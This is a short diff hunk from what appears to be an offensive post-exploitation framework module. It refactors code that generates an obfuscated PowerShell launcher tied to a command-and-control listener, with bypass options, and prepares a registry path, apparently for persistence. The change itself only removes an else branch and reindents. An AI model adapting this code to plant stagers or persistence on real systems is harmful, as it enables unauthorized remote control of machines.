@@ -45,18 +45,17 @@ class Module:
                 # not a valid listener, return nothing for the script
                 return handle_error_message("[!] Invalid listener: " + listener_name)
 
-            else:
-                # generate the PowerShell one-liner
-                launcher = main_menu.stagers.generate_launcher(
-                    listenerName=listener_name,
-                    language="powershell",
-                    obfuscate=launcher_obfuscate,
-                    obfuscation_command=launcher_obfuscate_command,
-                    bypasses=params["Bypasses"],
-                )
+            # generate the PowerShell one-liner
+            launcher = main_menu.stagers.generate_launcher(
+                listenerName=listener_name,
+                language="powershell",
+                obfuscate=launcher_obfuscate,
+                obfuscation_command=launcher_obfuscate_command,
+                bypasses=params["Bypasses"],
+            )
 
-                enc_script = launcher.split(" ")[-1]
-                # statusMsg += "using listener " + listenerName
+            enc_script = launcher.split(" ")[-1]
+            # statusMsg += "using listener " + listenerName
 
             path = "\\".join(reg_path.split("\\")[0:-1])
             name = reg_path.split("\\")[-1]
